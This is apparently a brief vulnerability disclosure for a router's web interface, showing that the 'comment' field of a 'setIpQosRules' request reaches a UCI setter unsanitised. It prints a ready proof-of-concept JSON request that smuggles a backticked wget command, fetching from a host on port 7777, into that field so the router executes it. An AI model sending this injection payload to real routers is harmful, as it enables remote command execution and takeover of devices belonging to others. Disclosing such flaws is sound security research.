...
In sub_42DEA0 function, it reads in a user-provided parameter `comment` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `comment` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setIpQosRules","upBandwidth":"1","dwBandwidth":"1","comment":"`wget 192.168.6.1:7777/testpoc`"
}	
```
